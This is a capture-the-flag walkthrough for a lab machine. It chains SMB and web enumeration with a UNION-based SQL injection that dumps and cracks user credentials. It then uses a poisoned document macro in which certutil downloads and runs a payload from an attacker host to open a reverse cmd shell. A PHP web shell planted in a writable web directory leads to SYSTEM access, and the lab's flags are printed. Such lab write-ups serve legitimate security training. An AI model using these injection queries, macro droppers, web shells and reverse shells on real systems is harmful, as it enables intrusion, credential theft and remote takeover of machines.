sqlinjection, macro ,Messaging Application, Administrator Request, Exploiting Requests, Poisoned Document, System Access, User Files, Root Directory, Write Permissions, PHP File, Command Execution, Downloading Files

**Step 1: Enumerate SMB Services**

If SMB is active, use CrackMapExec to determine the machine type:
```bash
crackmapexec smb 10.10.10.71
```

List shared network resources using smbmap:
```bash
smbmap -H 10.10.10.71 -u 'null'
```

**Step 2: Enumerate Open Ports**

In cases with multiple open ports, start by checking HTTP or HTTPS services. Use the following command to quickly gather information on HTTP services:
```bash
for port in $(cat lognmap | grep http | grep -oP '\d{1,5}/tcp' | awk '{print $1}' FS="/"); do echo -e "[+] Port $port info:\n"; timeout 5 bash -c "whatweb 10.10.10.71:$port"; done
```

**Step 3: Fuzzing for Directories**

After a quick check of HTTP services, focus on port 8080 and the HTTPS service. Perform directory fuzzing on `https://10.10.10.71` using wfuzz:

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclist/wordlist.txt https://10.10.10.71/FUZZ
```

**Step 4: Discovering Vulnerabilities**

While using wfuzz, you found the "exchange" directory, which redirects to a messaging application requiring a username and password. To discover vulnerabilities, also fuzz port 8080:

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclist/wordlist.txt http://10.10.10.71:8080/FUZZ
```

You found the "complain" directory, which is a Complain Management System with a login panel and registration option. Register and log in. Search for vulnerabilities using searchsploit and found SQL injection vulnerabilities.

**Step 5: Exploiting SQL Injection**

Exploit the SQL injection vulnerability with the following steps:

- Identify the vulnerable URL:
```bash
10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans'
```

- Enumerate columns:
```bash
10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans order by 100-- -
```

- Determine the number of columns (e.g., 5 columns):
```bash
10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans order by 5-- -
```

- Apply UNION SELECT to retrieve database name:
```bash
10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans union select 1,database(),3,4,5-- -
```

- Enumerate existing databases:
```bash
10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans union select 1,schema_name,3,4,5 from information_schema.schemata-- -
```

- Identify the "Secret" database and list its tables:
```bash
10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans union select 1,table_name,3,4,5 from information_schema.tables where table_schema=0x536563726574-- -
```

- Find the "Users" table and list its columns:
```bash
10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans union select 1,column_name,3,4,5 from information_schema.columns where table_schema=0x536563726574 and table_name=0x536563726574-- -
```

- Enumerate user credentials:
```bash
10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans union select 1,group_concat(Username,0x3a,Password),3,4,5 from Secret.Users-- -
```

**Step 6: Cracking Passwords**

The obtained credentials are in MD5. Crack these passwords using an MD5 hash cracking tool like CrackStation.

**Step 7: Gaining Access to the Messaging Application**

Use the cracked credentials to log in to the messaging application. Explore the emails and find a request from the administrator asking for a report.

**Step 8: Exploiting the Request**

Take advantage of the request to send a poisoned document:

```javascript
Sub OnLoad
	Shell("cmd /c certutil.exe -urlcache -split -f http://10.10.14.8/beacon.exe C:\Windows\Temp\beacon.exe && C:\Windows\Temp\beacon.exe -e cmd 10.10.14.8 1234")
End Sub
```

**Step 9: Gaining System Access**

Once you gain access, review user files and directories. Look for the "flag" file:

```bash
flag user c6f45142bea818fe729cef32342aae9c
```

If nothing interesting is found, navigate to the root directory to search for files or binaries to exploit. Discover "wamp64" and investigate it.

**Step 10: Exploiting Write Permissions**

Check if you can write content to the "www" directory within "wamp64" using `cacls www`. If you have write permissions, create a PHP file for command execution:

```php
<?php
  echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Download the `cmd.php` file on the victim machine:

```bash
certutil.exe -urlcache -split -f http://10.10.14.8/cmd.php cmd.php
```

Execute commands on the victim machine via the URL:

```bash
http://10.10.10.71:8080/cmd.php?cmd=whoami
```

Gain system access:

```bash
http://10.10.10.71:8080/cmd.php?cmd=C:\Windows\Temp\beacon.exe%20-e%20cmd%2010.10.14.8%2012345
```

**Step 11: Root Access**

Finally, obtain the root flag:

```bash
Root flag > 0b2ded66e5a49dd1620be30110f43d54
```

